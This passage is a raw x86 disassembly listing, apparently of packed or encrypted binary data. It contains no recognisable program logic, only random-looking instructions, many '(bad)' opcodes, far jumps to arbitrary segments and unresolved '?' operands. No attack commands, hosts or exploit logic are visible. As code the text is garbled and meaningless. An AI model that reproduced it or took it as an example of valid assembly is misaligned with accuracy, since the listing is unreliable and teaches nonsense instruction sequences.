  4234ae:	bound  eax,QWORD PTR [ebp+0x7257f8a4]
  4234b4:	adc    esp,DWORD PTR [ebx+0x1172ff70]
  4234ba:	xor    cl,BYTE PTR [edx+0x4be0cdff]
  4234c0:	dec    ebx
  4234c1:	pop    esi
  4234c2:	mov    DWORD PTR [edx],ebp
  4234c4:	jb     0x4234da
  4234c6:	stc    
  4234c7:	push   0x37
  4234c9:	pusha  
  4234ca:	das    
  4234cb:	or     ebp,esi
  4234cd:	inc    ebx
  4234ce:	and    DWORD PTR [esi-0x34aa1468],0x8cd5a869
  4234d8:	(bad)  
  4234d9:	sub    eax,0x9355da7b
  4234de:	push   edi
  4234df:	adc    ch,cl
  4234e1:	ror    DWORD PTR [esi+0x157913d2],1
  4234e7:	xchg   esp,eax
  4234e8:	ror    BYTE PTR [edi+0x33],0xe8
  4234ec:	retf   
  4234ed:	add    eax,DWORD PTR [eax]
	...
  423553:	add    BYTE PTR [eax],al
  423555:	add    al,al
  423557:	mov    al,0x45
  423559:	outs   dx,DWORD PTR ds:[esi]
  42355a:	jne    0x42355b
  42355c:	jmp    0x2b1f:0xadf467bf
  423563:	dec    esi
  423564:	ds aam 0x67
  423567:	jnp    0x42356a
  423569:	add    BYTE PTR [eax],al
  42356b:	add    DWORD PTR [eax],eax
  42356d:	add    dl,ch
  42356f:	jl     0x42353b
  423571:	fist   WORD PTR ds:0x9164beb9
  423577:	in     eax,dx
  423578:	or     al,0x7b
  42357a:	ss jns 0x42357a
  42357d:	hlt    
  42357e:	dec    eax
  42357f:	les    edi,FWORD PTR [ebx-0x32bc6d49]
  423585:	mov    DWORD PTR [ecx-0x2f9be4f6],edx
  42358b:	data16 hlt 
  42358d:	retf   
  42358e:	push   0xd1ea5cb0
  423593:	jnp    0x42355e
  423595:	pop    ecx
  423596:	sahf   
  423597:	out    0x33,eax
  423599:	push   es
  42359a:	xor    ebx,DWORD PTR [ecx+0x23f9473c]
  4235a0:	aad    0xbd
  4235a2:	mov    esp,0x23fb82b9
  4235a7:	sti    
  4235a8:	ficom  DWORD PTR ds:0xe5f0cc20
  4235ae:	mov    dh,0xc3
  4235b0:	mov    ds,WORD PTR [ebp+0x55]
  4235b3:	nop
  4235b4:	xor    eax,0xf72b7028
  4235b9:	sub    al,0xa3
  4235bb:	(bad)  
  4235bc:	ins    BYTE PTR es:[edi],dx
  4235bd:	clc    
  4235be:	jb     0x4235ce
  4235c0:	int3   
  4235c1:	pop    es
  4235c2:	leave  
  4235c3:	shl    BYTE PTR [eax],0x96
  4235c6:	mov    cl,0x42
  4235c8:	pop    es
  4235c9:	mov    dl,0x83
  4235cb:	(bad)  
  4235cc:	inc    esi
  4235cd:	mov    dl,0x83
  4235cf:	in     eax,0xdd
  4235d1:	push   esp
  4235d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235d3:	dec    ebx
  4235d4:	add    esi,edx
  4235d6:	out    0x92,eax
  4235d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235d9:	jae    0x4235ae
  4235db:	add    eax,DWORD PTR [edi+0xd19a91e]
  4235e1:	lods   al,BYTE PTR ds:[esi]
  4235e2:	clc    
  4235e3:	ins    BYTE PTR es:[edi],dx
  4235e4:	jo     0x42365b
  4235e6:	mov    dl,0x45
  4235e8:	fsub   st(5),st
  4235ea:	fscale 
  4235ec:	and    DWORD PTR [ebx-0x703851f6],0x10e20038
  4235f6:	cld    
  4235f7:	push   ecx
  4235f8:	rol    DWORD PTR [ecx],0x32
  4235fb:	mov    ecx,0x61473d22
  423600:	enter  0x277e,0xdf
  423604:	retf   
  423605:	fst    st(7)
  423607:	xor    ecx,esp
  423609:	lods   al,BYTE PTR ds:[esi]
  42360a:	(bad)  
  42360b:	cmp    ecx,DWORD PTR ds:0xe79203fa
  423611:	xchg   edi,eax
  423612:	dec    edi
  423613:	and    DWORD PTR [edi+ebx*2-0x3d],eax
  423617:	bound  ecx,QWORD PTR [ebx]
  423619:	xchg   ebp,eax
  42361a:	push   0x6a6954ef
  42361f:	repz jle 0x423670
  423622:	mov    bl,0x83
  423624:	jae    0x42360d
  423626:	jb     0x4235fb
  423628:	jb     0x4235f9
  42362a:	ror    BYTE PTR [ebx-0x68],1
  42362d:	inc    edx
  42362e:	jb     0x423637
  423630:	(bad)  
  423631:	repz imul edx,DWORD PTR [esi-0x6d96887f],0xffffff81
  423639:	xchg   dl,dl
  42363b:	int3   
  42363c:	into   
  42363d:	pop    eax
  42363e:	sbb    eax,0xf9ffffe2
  423644:	pusha  
  423645:	xor    DWORD PTR [ebx+eiz*4],ecx
  423648:	jae    0x42360f
  42364a:	lds    eax,FWORD PTR [edi+eiz*1-0x60ab67c2]
  423651:	mov    eax,0x64c0f78b
  423656:	xchg   ebx,eax
  423657:	mov    eax,0xeb0dcdf3
  42365c:	adc    eax,0xb57a6720
  423661:	mov    al,0x2b
  423663:	sti    
  423664:	outs   dx,DWORD PTR ds:[esi]
  423665:	loopne 0x42367a
  423667:	retf   0x5d8f
  42366a:	pop    ebx
  42366b:	pop    eax
  42366c:	(bad)  [esi+0x0]
	...
  4236d3:	add    BYTE PTR [eax],al
  4236d5:	add    BYTE PTR [eax+0x7f747c8f],al
  4236db:	test   DWORD PTR [eax+0x7c916eff],0x483f8e13
  4236e5:	cmp    eax,0x17c67
  4236ea:	add    BYTE PTR [ecx],al
  4236ec:	add    BYTE PTR [eax],al
  4236ee:	pop    ecx
  4236ef:	pop    esp
  4236f0:	sbb    eax,0x6f173add
  4236f5:	(bad)  
  4236f6:	ins    BYTE PTR es:[edi],dx
  4236f7:	je     0x423730
  4236f9:	inc    esi
  4236fa:	int3   
  4236fb:	add    edx,DWORD PTR ds:[ebp+0x1c906cd8]
  423702:	dec    edx
  423703:	out    0xd7,al
  423705:	pop    edx
  423706:	pop    ebx
  423707:	push   ecx
  423708:	push   esi
  423709:	cwde   
  42370a:	jl     0x42371b
  42370c:	xor    eax,DWORD PTR [edi+ebx*1]
  42370f:	pop    ecx
  423710:	inc    edi
  423711:	sub    BYTE PTR [esi+0x3a],dl
  423714:	jb     0x42375d
  423716:	inc    edx
  423717:	sti    
  423718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423719:	and    cl,BYTE PTR [esi]
  42371b:	(bad)  
  42371c:	cmp    ecx,DWORD PTR [ebx]
  42371e:	lahf   
  42371f:	frstor [ecx]
  423721:	xchg   esp,eax
  423722:	jle    0x42377b
  423724:	out    dx,al
  423725:	call   0x2a7c:0x1090c824
  42372c:	sub    BYTE PTR [eax],0xff
  42372f:	add    eax,0xbf19f1ed
  423734:	out    dx,al
  423735:	ds dec esp
  423737:	mov    esp,0x950807bd
  42373c:	mov    edi,0xb88786dd
  423741:	test   BYTE PTR [eax],bl
  423743:	in     al,0x87
  423745:	stc    
  423746:	les    ebx,FWORD PTR [eax+0x738db944]
  42374c:	push   0xd185617f
  423751:	xor    eax,0x6398e6c8
  423756:	mov    ch,0x99
  423758:	xchg   ebp,ebx
  42375a:	inc    DWORD PTR [edx]
  42375c:	push   ebx
  42375d:	adc    al,0x38
  42375f:	xor    esi,DWORD PTR [edx+eiz*2]
  423762:	stc    
  423763:	mov    BYTE PTR [edx-0x61],al
  423766:	mov    al,0xc2
  423768:	in     eax,dx
  423769:	or     ah,BYTE PTR [ebp+edx*2+0x6f]
  42376d:	mov    es,WORD PTR [ecx]
  42376f:	aad    0xf2
  423771:	jo     0x42377e
  423773:	xchg   edi,eax
  423774:	(bad)  
  423775:	js     0x4237a4
  423777:	add    BYTE PTR [esp+edi*2+0x6c],bl
  42377b:	aas    
  42377c:	add    bh,BYTE PTR [ecx]
  42377e:	pusha  
  42377f:	in     eax,dx
  423780:	ret    0x3988
  423783:	add    bl,BYTE PTR [esi+0x1e]
  423786:	daa    
  423787:	add    DWORD PTR [edx+0x59],esp
  42378a:	mov    eax,esp
  42378c:	jmp    0xde3cb9f8
  423791:	ds test dl,dh
  423794:	dec    esp
  423795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423796:	push   es
  423797:	sbb    al,0x8a
  423799:	(bad)  
  42379b:	pop    edi
  42379c:	iret   
  42379d:	jae    0x423756
  42379f:	je     0x4237cc
  4237a1:	test   ecx,ebx
  4237a3:	or     DWORD PTR [edx+0x79c6d1d5],0xcde6a190
  4237ad:	mov    eax,0x81fad2b5
  4237b2:	mov    ds:0xe7df1c1,al
  4237b7:	out    dx,eax
  4237b8:	mov    DWORD PTR [ebx+0x4],edx
  4237bb:	add    al,0xd
  4237bd:	outs   dx,DWORD PTR ds:[esi]
  4237be:	or     ebp,DWORD PTR [esi+edi*4-0x69]
  4237c2:	dec    eax
  4237c3:	jge    0x4237bb
  4237c5:	adc    BYTE PTR [ebx+0x6f65e369],0x6a
  4237cc:	push   ebp
  4237cd:	in     eax,dx
  4237ce:	(bad)  
  4237d2:	adc    bh,ah
  4237d4:	call   0x9f1b:0xe03232e6
  4237db:	arpl   ax,di
  4237dd:	stos   BYTE PTR es:[edi],al
  4237de:	add    DWORD PTR [edx],edx
  4237e0:	pop    ecx
  4237e1:	adc    dl,BYTE PTR [edi]
  4237e3:	das    
  4237e4:	sub    ecx,ebp
  4237e6:	retf   0xc1f9
  4237e9:	out    0xa6,eax
  4237eb:	pop    ebx
  4237ec:	and    BYTE PTR [eax+0x0],al
	...
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0xa2904021
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	adc    ch,BYTE PTR [edx]
  423870:	fcompp 
  423872:	shl    BYTE PTR [eax],1
  423874:	scas   eax,DWORD PTR es:[edi]
  423875:	ss (bad) 
  423877:	int    0x34
  423879:	add    dh,dh
  42387b:	scas   al,BYTE PTR es:[edi]
  42387c:	pop    ecx
  42387d:	inc    eax
  42387e:	shl    BYTE PTR [eax],0xed
  423881:	aad    0x5d
  423883:	or     DWORD PTR [esi-0x5],0xd4291ccc
  42388a:	push   edi
  42388b:	(bad)  
  42388c:	loopne 0x4238d0
  42388e:	leave  
  42388f:	push   ss
  423890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423891:	sbb    ecx,esi
  423893:	cmp    DWORD PTR [edi-0x3b],edi
  423896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423897:	out    dx,al
  423898:	sbb    al,0x93
  42389a:	xor    eax,0x77e84309
  42389f:	test   al,0xdf
  4238a1:	dec    eax
  4238a2:	adc    dh,BYTE PTR [edi]
  4238a4:	cmp    ebx,eax
  4238a6:	cwde   
  4238a7:	push   0xd9f8f1c0
  4238ac:	add    DWORD PTR [edx+0x3c],ecx
  4238af:	retf   
  4238b0:	and    edi,edx
  4238b2:	cdq    
  4238b3:	dec    BYTE PTR [esi+ebx*1]
  4238b6:	mov    ?,edx
  4238b8:	imul   esp,ebp,0x1a4f9067
  4238be:	jns    0x423918
  4238c0:	call   0x7458:0xf3a7ab74
  4238c7:	sbb    ch,BYTE PTR [edx+0x11]
  4238ca:	ds call 0xec5da532
  4238d0:	retf   0xcfa7
  4238d3:	mov    esp,0xca3ed4db
  4238d8:	fdivr  st(4),st
  4238da:	push   edx
  4238db:	mov    WORD PTR [eax+0x44f13c0d],cs
  4238e1:	mov    ?,ebp
  4238e3:	add    eax,0x751c54e3
  4238e8:	shl    ch,1
  4238ea:	out    dx,al
  4238eb:	mov    ds:0x132341d8,al
  4238f0:	icebp  
  4238f1:	add    al,BYTE PTR [ebx]
  4238f3:	cli    
  4238f4:	retf   0xd8ff
  4238f7:	sahf   
  4238f8:	and    DWORD PTR [edi],esp
  4238fa:	addr16 add eax,0xc16e9b8f
  423900:	push   edi
  423901:	pop    edx
  423902:	xchg   esp,eax
  423903:	jae    0x4238aa
  423905:	cmp    esi,ebp
  423907:	pop    ss
  423908:	dec    ebx
  423909:	icebp  
  42390a:	xor    eax,0xba2be014
  42390f:	cmp    ebx,DWORD PTR [esi-0x3128d1e4]
  423915:	mov    al,ds:0x4fb1a69d
  42391a:	mov    dl,0x61
  42391c:	popf   
  42391d:	push   0x66
  42391f:	test   DWORD PTR [ecx-0x76],0x5bf0d936
  423926:	sub    edi,DWORD PTR [ecx-0x3d]
  423929:	test   BYTE PTR [esi+ecx*1+0x53a6314f],bh
  423930:	into   
  423931:	sbb    esp,eax
  423933:	mov    al,0x4
  423935:	mov    al,0xa9
  423937:	scas   al,BYTE PTR es:[edi]
  423938:	dec    eax
  423939:	xor    ch,dh
  42393b:	dec    eax
  42393c:	add    BYTE PTR [ebx-0x7f107936],dh
  423942:	sbb    DWORD PTR [ecx+0x1eae7796],edx
  423948:	lahf   
  423949:	int3   
  42394a:	jl     0x4239c2
  42394c:	mov    edi,0xe6843b19
  423951:	xlat   BYTE PTR ds:[ebx]
  423952:	test   al,0xf0
  423954:	ins    DWORD PTR es:[edi],dx
  423955:	fiadd  DWORD PTR [edi+eax*2-0x2a]
  423959:	dec    ebx
  42395a:	dec    eax
  42395b:	and    BYTE PTR [eax-0x38c03768],dl
  423961:	cmp    BYTE PTR [edi-0x7af1cb23],dl
  423967:	adc    BYTE PTR [ebp-0x65c6f133],0xf2
	...
  4239d6:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0x5a522bbd
  4239e4:	ins    BYTE PTR es:[edi],dx
  4239e5:	shl    BYTE PTR [edi+0x7e],0x1
  4239e9:	add    BYTE PTR [eax],al
  4239eb:	add    DWORD PTR [eax],eax
  4239ed:	add    BYTE PTR [ebx],ch
  4239ef:	cld    
  4239f0:	ss cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4239f3:	icebp  
  4239f4:	sbb    ebx,DWORD PTR [ecx-0x662ccd4c]
  4239fa:	es ins BYTE PTR es:[edi],dx
  4239fc:	push   ss
  4239fd:	imul   edi
  4239ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a00:	fsub   DWORD PTR [esi]
  423a02:	cmc    
  423a03:	out    0xb1,eax
  423a05:	(bad)  
  423a06:	dec    ebp
  423a07:	dec    esi
  423a08:	cld    
  423a09:	loopne 0x423a75
  423a0b:	sbb    edi,DWORD PTR [edx]
  423a0d:	inc    edx
  423a0e:	(bad)  
  423a10:	das    
  423a11:	mov    al,ds:0xe70a8b65
  423a16:	adc    bl,BYTE PTR [eax+0x33]
  423a19:	mov    ebp,0x23957b57
  423a1e:	lods   eax,DWORD PTR ds:[esi]
  423a1f:	iret   
  423a20:	or     al,0xc5
  423a22:	hlt    
  423a23:	js     0x423a86
  423a25:	push   edx
  423a26:	call   edx
  423a28:	xchg   ebp,eax
  423a29:	ret    
  423a2a:	in     eax,dx
  423a2b:	xor    eax,0x56377ddb
  423a30:	and    eax,eax
  423a32:	popf   
  423a33:	and    ebx,edi
  423a35:	push   ss
  423a36:	aad    0xc9
  423a38:	into   
  423a39:	loope  0x4239e4
  423a3b:	ret    0x6a51
  423a3e:	mov    ch,0xf5
  423a40:	jl     0x423a01
  423a42:	push   ebx
  423a43:	adc    esp,DWORD PTR [edi-0x23973477]
  423a49:	push   0x1c2ed495
  423a4e:	push   ebp
  423a4f:	pop    eax
  423a50:	shl    BYTE PTR [esi],0x41
  423a53:	sti    
  423a54:	dec    eax
  423a55:	mov    eax,ds:0xbf96be74
  423a5a:	xchg   DWORD PTR ds:0x37030b02,eax
  423a60:	jb     0x423a6d
  423a62:	in     al,dx
  423a63:	jo     0x423a1d
  423a65:	push   ebp
  423a66:	sub    DWORD PTR [eax+0x27],ecx
  423a69:	add    al,0x2a
  423a6b:	mov    ch,0x75
  423a6d:	dec    ebx
  423a6e:	punpcklbw mm2,mm4
  423a71:	aad    0xb9
  423a73:	xchg   edi,eax
  423a74:	jmp    0xe7b3f757
  423a79:	push   esp
  423a7a:	jg     0x423a38
  423a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a7d:	push   esp
  423a7e:	mov    ds:0xf7e4ec72,eax
  423a83:	xor    DWORD PTR [esi],esp
  423a85:	cld    
  423a86:	stos   BYTE PTR es:[edi],al
  423a87:	xchg   BYTE PTR [esi],cl
  423a89:	sub    BYTE PTR [ebx-0x1b],bh
  423a8c:	sbb    BYTE PTR [ebx-0x4],ch
  423a8f:	adc    al,0x96
  423a91:	ds stos DWORD PTR es:[edi],eax
  423a93:	push   0x3ff0aed9
  423a98:	ins    BYTE PTR es:[edi],dx
  423a99:	or     BYTE PTR [eax+0x3f0c4c4],ah
  423a9f:	xor    eax,0x1bb39724
  423aa4:	(bad)  
  423aa5:	pop    ds
  423aa6:	stos   DWORD PTR es:[edi],eax
  423aa7:	mov    WORD PTR ds:0xda219e89,?
  423aad:	mov    edi,0x544d30bd
  423ab2:	loop   0x423ab0
  423ab4:	sti    
  423ab5:	in     al,dx
  423ab6:	mov    dl,0x9e
  423ab8:	push   0xcbba2165
  423abd:	test   BYTE PTR [eax+0x695bd0f0],bl
  423ac3:	adc    dl,dl
  423ac5:	push   edx
  423ac6:	addr16 add eax,0x38bee94e
  423acc:	sbb    al,0x8c
  423ace:	inc    DWORD PTR [ebx+0x6ed65399]
  423ad4:	mov    ebx,eax
  423ad6:	cmp    BYTE PTR [edx+0x7c],bl
  423ad9:	mov    edi,0xaad3cafb
  423ade:	fst    DWORD PTR [esi+ebx*1]
  423ae1:	int    0xc2
  423ae3:	or     ebx,esi
  423ae5:	cli    
  423ae6:	dec    edx
  423ae7:	(bad)  
  423ae9:	mov    BYTE PTR [edx],ah
  423aeb:	les    edi,FWORD PTR [edi+0xbf]
	...
  423b55:	add    BYTE PTR [eax],dh
  423b57:	cmp    eax,0xdf7d9f75
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	int3   
  423b63:	mov    ebp,0x7f674c2d
  423b68:	add    DWORD PTR [eax],eax
  423b6a:	add    BYTE PTR [ecx],al
  423b6c:	add    BYTE PTR [eax],al
  423b6e:	jmp    0xbfec:0x986c05ec
  423b75:	inc    ecx
  423b76:	(bad)  
  423b77:	fld    DWORD PTR [edi+ebx*2-0x6d]
  423b7b:	sbb    BYTE PTR [eax-0x33],0x78
  423b7f:	call   0x329bde29
  423b84:	bound  edi,QWORD PTR [esi+0x36e39987]
  423b8a:	bound  eax,QWORD PTR [ebp-0x7e613834]
  423b90:	icebp  
  423b91:	mov    ebx,0x72adbe3
  423b96:	int    0xce
  423b98:	pop    esi
  423b99:	add    ecx,DWORD PTR [esi+0x69]
  423b9c:	add    DWORD PTR [ecx-0x3c15e7af],0xc6bcf67a
  423ba6:	rol    ecx,0x6c
  423ba9:	fbld   TBYTE PTR [eax]
  423bab:	sub    bl,0xdc
  423bae:	sub    DWORD PTR [eax-0x2],0xa1ec5cef
  423bb5:	scas   eax,DWORD PTR es:[edi]
  423bb6:	cmp    BYTE PTR [ebp-0x20],ah
  423bb9:	mov    bl,0x7a
  423bbb:	test   BYTE PTR [edx-0x79],bh
  423bbe:	ins    DWORD PTR es:[edi],dx
  423bbf:	inc    ebp
  423bc0:	aad    0x21
  423bc2:	cwde   
  423bc3:	ret    
  423bc4:	jl     0x423bbb
  423bc6:	xchg   edi,eax
  423bc7:	mov    esp,es
  423bc9:	jb     0x423c2c
  423bcb:	lea    edx,[esp+eiz*8+0x33547ecb]
  423bd2:	mov    al,0x43
  423bd4:	int3   
  423bd5:	ins    DWORD PTR es:[edi],dx
  423bd6:	add    al,0x12
  423bd8:	inc    ah
  423bda:	and    ebx,eax
  423bdc:	push   es
  423bdd:	push   ebx
  423bde:	xor    DWORD PTR [ebp+0x71cdda10],edi
  423be4:	popa   
  423be5:	push   ecx
  423be6:	lods   eax,DWORD PTR ds:[esi]
  423be7:	add    al,0xf4
  423be9:	inc    esi
  423bea:	xor    DWORD PTR ds:0xb37e99a2,ebx
  423bf0:	sub    eax,0xb9e93c3f
  423bf5:	loopne 0x423b83
  423bf7:	xchg   BYTE PTR [ebx+ebp*1],bh
  423bfa:	or     eax,0x433f695d
  423bff:	inc    ebx
  423c00:	push   ecx
  423c01:	or     al,0x5
  423c03:	push   ecx
  423c04:	pop    esp
  423c05:	inc    edx
  423c06:	adc    eax,0x8eb4b612
  423c0b:	push   0xfffffffa
  423c0d:	push   0xc030ec0b
  423c12:	or     eax,0xf361c5db
  423c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c18:	dec    ecx
  423c19:	pop    ebx
  423c1a:	dec    esp
  423c1b:	ins    BYTE PTR es:[edi],dx
  423c1c:	mov    edx,0x383f4d40
  423c21:	cs push cs
  423c23:	push   0xfffffffc
  423c25:	mov    ebx,0xa0fce52f
  423c2a:	mov    cl,BYTE PTR [edi]
  423c2c:	push   ss
  423c2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c2e:	xor    eax,0xec4f62da
  423c33:	clc    
  423c34:	fbstp  TBYTE PTR [edi]
  423c36:	sbb    DWORD PTR [ecx+0x26],0xffffffb5
  423c3a:	mov    esi,0xc8322c9d
  423c3f:	adc    ch,ah
  423c41:	push   esi
  423c42:	clc    
  423c43:	rcr    DWORD PTR [eax],1
  423c45:	retf   0xa53a
  423c48:	jmp    0xa13da3d
  423c4d:	ret    0x861d
  423c50:	pop    esi
  423c51:	les    edx,FWORD PTR [edi-0x48]
  423c54:	ja     0x423c7f
  423c56:	mov    DWORD PTR [edi-0x48578e4e],esp
  423c5c:	xchg   esp,eax
  423c5d:	xchg   ebx,eax
  423c5e:	cwde   
  423c5f:	add    BYTE PTR [esi+0x1aef2ee9],ah
  423c65:	mov    esp,0x7ad95ca5
  423c6a:	dec    ebx
  423c6b:	mov    ecx,0x300a
	...
  423cd4:	add    BYTE PTR [eax],al
  423cd6:	std    
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax+0x3c446617]
  423ce3:	adc    DWORD PTR [edx+0x18067f9],edi
  423ce9:	add    BYTE PTR [eax],al
  423ceb:	add    DWORD PTR [eax],eax
  423ced:	add    BYTE PTR [ebx-0x35a57dec],dh
  423cf3:	outs   dx,DWORD PTR ds:[esi]
  423cf4:	and    BYTE PTR [edx-0x41],0xbd
  423cf8:	pop    eax
  423cf9:	inc    ebx
  423cfa:	cmp    al,0x73
  423cfc:	or     DWORD PTR [eax+0x14],0x87ec5c17
  423d03:	xchg   edi,eax
  423d04:	cdq    
  423d05:	pop    es
  423d06:	aam    0x17
  423d08:	sub    eax,0x39279dbf
  423d0d:	xor    al,0x53
  423d0f:	mov    ch,0xc8
  423d11:	mov    ?,WORD PTR [edi+0x7a]
  423d14:	retf   0x6479
  423d17:	das    
  423d18:	mov    BYTE PTR [ebx+eax*4],dh
  423d1b:	es jl  0x423cca
  423d1e:	xor    al,0x42
  423d20:	cwde   
  423d21:	gs pusha 
  423d23:	jo     0x423d9a
  423d25:	dec    ebp
  423d26:	test   al,0x5d
  423d28:	inc    ebx
  423d29:	(bad)  
  423d2a:	int3   
  423d2b:	jne    0x423d1b
  423d2d:	push   edi
  423d2e:	mov    bh,0xcc
  423d30:	mov    DWORD PTR [eax+0x13],esp
  423d33:	jecxz  0x423d6e
  423d35:	sbb    DWORD PTR [edx],ecx
  423d37:	pop    esp
  423d38:	ins    DWORD PTR es:[edi],dx
  423d39:	popf   
  423d3a:	cmp    cl,bl
  423d3c:	and    bh,BYTE PTR [eax]
  423d3e:	xchg   BYTE PTR [eax],ah
  423d40:	xchg   esi,ebx
  423d42:	out    0x12,eax
  423d44:	dec    edx
  423d45:	dec    esi
  423d46:	call   FWORD PTR [eax]
  423d48:	loop   0x423d6d
  423d4a:	daa    
  423d4b:	out    0xfb,al
  423d4d:	rcr    DWORD PTR [ecx-0x7a],cl
  423d50:	push   0xffffffde
  423d52:	idiv   DWORD PTR [ecx+ecx*1]
  423d55:	out    dx,al
  423d56:	dec    ebx
  423d57:	clc    
  423d58:	retf   0x6f5d
  423d5b:	cs cmp eax,0xc04224c9
  423d61:	sub    DWORD PTR [ecx+0x1c],0xc
  423d65:	(bad)  
  423d66:	xchg   esi,eax
  423d67:	jecxz  0x423db3
  423d69:	dec    esp
  423d6a:	in     al,dx
  423d6b:	add    al,0x5d
  423d6d:	jmp    0xa9ca:0x69b7049
  423d74:	fsubr  DWORD PTR [esi+0x1049f798]
  423d7a:	repz mov al,ds:0x31623b68
  423d80:	call   0xe43bf320
  423d85:	or     al,BYTE PTR [edi]
  423d87:	xor    dl,al
  423d89:	ret    
  423d8a:	push   ebx
  423d8b:	ja     0x423d2f
  423d8d:	jmp    0x423d48
  423d8f:	stos   BYTE PTR es:[edi],al
  423d90:	push   0xc439ab75
  423d95:	xor    eax,0xbf0c996a
  423d9a:	sub    DWORD PTR [esi-0x280258e],0x34
  423da1:	jbe    0x423d61
  423da3:	inc    ecx
  423da4:	push   ds
  423da5:	shr    BYTE PTR [esi-0x4985bd26],1
  423dab:	push   cs
  423dac:	mov    ah,0xf7
  423daf:	stos   DWORD PTR es:[edi],eax
  423db0:	xor    DWORD PTR [edx-0x6d],esp
  423db3:	int3   
  423db4:	les    esp,FWORD PTR [ecx-0x21]
  423db7:	and    eax,0xfb05d128
  423dbc:	mov    ebp,0xa238fb7f
  423dc1:	jno    0x423e02
  423dc3:	(bad)  
  423dc4:	pop    edx
  423dc5:	fucomip st,st(2)
  423dc7:	std    
  423dc8:	popf   
  423dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423dca:	jbe    0x423d7c
  423dcc:	jmp    0x21ea:0x25700dc3
  423dd3:	dec    ecx
  423dd4:	inc    edi
  423dd5:	mov    edi,0x6b0ef2e6
  423dda:	inc    esi
  423ddb:	pop    eax
  423ddc:	test   WORD PTR [ecx],di
  423ddf:	mov    dx,0x5787
  423de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423de4:	int    0x74
  423de6:	jl     0x423d7d
  423de8:	popf   
  423de9:	mov    al,0x78
  423deb:	or     ch,ah
  423ded:	pusha  
	...
  423e56:	(bad)  
  423e57:	test   BYTE PTR [edi-0x118668f7],0xff
  423e5e:	daa    
  423e5f:	mov    DWORD PTR [eax-0x140ebb2e],esp
  423e65:	pop    ebp
  423e66:	add    DWORD PTR [bx+di],0x10000
  423e6d:	add    BYTE PTR [ecx+0x36a4cc74],ch
  423e73:	ss out 0x1,al
  423e76:	les    ebp,FWORD PTR [esi-0x71]
  423e79:	push   ecx
  423e7a:	mov    ecx,0x3679415e
  423e7f:	mov    ebp,0x398729c4
  423e84:	pusha  
  423e85:	jge    0x423e07
  423e87:	jb     0x423eaf
  423e89:	adc    BYTE PTR [edi-0x3c],bl
  423e8c:	or     ebp,DWORD PTR [ecx*2+0x5f50397d]
  423e93:	mov    esp,0x264e3b53
  423e98:	push   es
  423e99:	or     ah,BYTE PTR [edi-0x76de9f5c]
  423e9f:	out    0x9a,al
  423ea1:	and    esi,DWORD PTR [ebx+0x34]
  423ea4:	cmc    
  423ea5:	xchg   edi,eax
  423ea6:	cmp    eax,0xb06cf9fd
  423eab:	and    dh,BYTE PTR [ebp+0x4d]
  423eae:	push   ebx
  423eaf:	ins    DWORD PTR es:[edi],dx
  423eb0:	fidiv  WORD PTR [edi]
  423eb2:	mov    ah,0x33
  423eb4:	mov    ebx,0x40574a58
  423eb9:	jecxz  0x423e40
  423ebb:	sbb    dh,BYTE PTR [edi+0x27]
  423ebe:	sahf   
  423ebf:	stos   BYTE PTR es:[edi],al
  423ec0:	in     al,0xae
  423ec2:	jmp    0xa34:0x86e2fe08
  423ec9:	mov    al,0xa5
  423ecb:	je     0x423f21
  423ecd:	lock add BYTE PTR [ebx],0xf
  423ed1:	dec    ebp
  423ed2:	xchg   esp,eax
  423ed3:	sub    ch,al
  423ed5:	mov    ds:0xf1f2e0ab,eax
  423eda:	or     al,0x41
  423edc:	rcr    bh,cl
  423ede:	and    BYTE PTR [ebp+eax*8+0x662c144e],dh
  423ee5:	shl    BYTE PTR [eax+0x13],1
  423ee8:	sbb    BYTE PTR [edi+0xe],0xec
  423eec:	mov    al,bh
  423eee:	mov    al,0xd7
  423ef0:	inc    ebx
  423ef1:	push   es
  423ef2:	xchg   ebp,eax
  423ef3:	lock or BYTE PTR [eax],cl
  423ef6:	cdq    
  423ef7:	mov    ecx,0x776fc042
  423efc:	xor    eax,0x2fc8064c
  423f01:	test   BYTE PTR [edx+0x72],0x33
  423f05:	adc    al,0x2f
  423f07:	or     DWORD PTR [esi],0xbcbedb2c
  423f0d:	xchg   BYTE PTR [esi-0x1a],ah
  423f10:	(bad)  
  423f11:	pusha  
  423f12:	out    dx,al
  423f13:	add    al,0x90
  423f15:	or     DWORD PTR [esp+ebx*1-0x6419c01b],eax
  423f1c:	enter  0x8227,0x41
  423f20:	outs   dx,DWORD PTR ds:[esi]
  423f21:	nop
  423f22:	xor    eax,0xc7bd4d6b
  423f27:	and    BYTE PTR [ecx-0x53],bh
  423f2a:	sbb    edi,edx
  423f2c:	sti    
  423f2d:	hlt    
  423f2e:	aas    
  423f2f:	xchg   DWORD PTR [esi+0x32],esi
  423f32:	jae    0x423f0f
  423f34:	aas    
  423f35:	jns    0x423fae
  423f37:	outs   dx,DWORD PTR ds:[esi]
  423f38:	jno    0x423fad
  423f3a:	xlat   BYTE PTR ds:[ebx]
  423f3b:	ret    0x3b6e
  423f3e:	jl     0x423f13
  423f40:	lods   eax,DWORD PTR ds:[esi]
